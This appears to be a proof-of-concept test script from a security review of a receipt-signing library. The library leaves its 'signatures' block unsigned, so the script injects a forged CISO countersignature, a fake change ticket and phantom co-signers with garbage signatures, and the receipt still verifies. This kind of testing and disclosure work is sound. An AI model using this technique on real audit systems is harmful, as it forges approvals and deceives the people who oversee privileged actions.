#!/usr/bin/env python3
"""S2.6: signature-region injection — the top-level 'signatures' block is
EXCLUDED from the signed bytes ({k: v for k, v in receipt.items() if
k != 'signatures'}). An attacker can therefore inject arbitrary trusted-
looking metadata INTO the signatures array of a valid receipt — forged
countersignatures, fake auditor approvals, phantom co-signers — without
invalidating verification. Only sigs[0]['sig'] is ever read; sigs[1:] are
never checked, and extra keys inside sig entries are never checked. Any UI
or auditor that displays the signatures block as attested content is
spoofable.

Prints EXPLOIT-WORKS if the doctored receipt still verifies PASS.
"""
import sys, copy, json
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         sha256_hex, keyid)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()
sk2, pk2 = generate_keypair()

r1 = build_receipt(action_id="a-700", subject_name="prod:svc", actor=HUMAN,
                   policy_decision=POL,
                   execution={"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

t = copy.deepcopy(r1)
# Inject forged approval metadata into the unauthenticated region.
t["signatures"][0]["countersigned_by"] = "Chief Information Security Officer"
t["signatures"][0]["approval_ticket"] = "CHG-0042"
t["signatures"].append({"keyid": keyid(pk2), "sig": "AAAAAAAAAAAAAAAA",
                        "role": "external-auditor", "verified": True})
t["signatures"].append({"keyid": keyid(pk2), "sig": "BBBBBBBBBBBB",
                        "role": "four-eyes-reviewer", "human_principal": "Jane CFO"})

v = verify_receipt(t, pk)
injected_present = (t["signatures"][0].get("countersigned_by") == "Chief Information Security Officer"
                    and len(t["signatures"]) == 3)
print(f"[V1] verdict={v.verdict}  injected countersignature survives={injected_present}  reasons={v.reasons}")
exploit = (v.verdict == "PASS") and injected_present

# V2: the phantom co-signers' sigs are garbage and NEVER checked.
garbage_unchecked = all(s["sig"] in ("AAAAAAAAAAAAAAAA", "BBBBBBBBBBBB") for s in t["signatures"][1:])
print(f"[V2] sigs[1:] garbage but unchecked={garbage_unchecked}")
exploit = exploit and garbage_unchecked

print("EXPLOIT-WORKS" if exploit else "HELD")
